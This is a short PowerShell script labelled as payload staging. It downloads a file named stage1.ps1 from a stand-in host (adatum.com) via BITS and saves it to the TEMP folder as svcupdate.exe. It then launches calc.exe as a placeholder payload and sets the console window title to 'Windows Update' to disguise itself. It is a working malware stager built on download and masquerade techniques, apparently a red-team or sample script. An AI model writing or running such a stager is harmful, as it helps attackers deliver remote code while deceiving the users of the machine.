<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://adatum.com:80/stage1.ps1",
    [string]$OutputPath = "$env:TEMP\svcupdate.exe",
    [int]$StageTimeout = 89
)
Start-BitsTransfer -Source $TransferUrl -Destination $OutputPath
Start-Process -FilePath "calc.exe"
$Host.UI.RawUI.WindowTitle = "Windows Update"
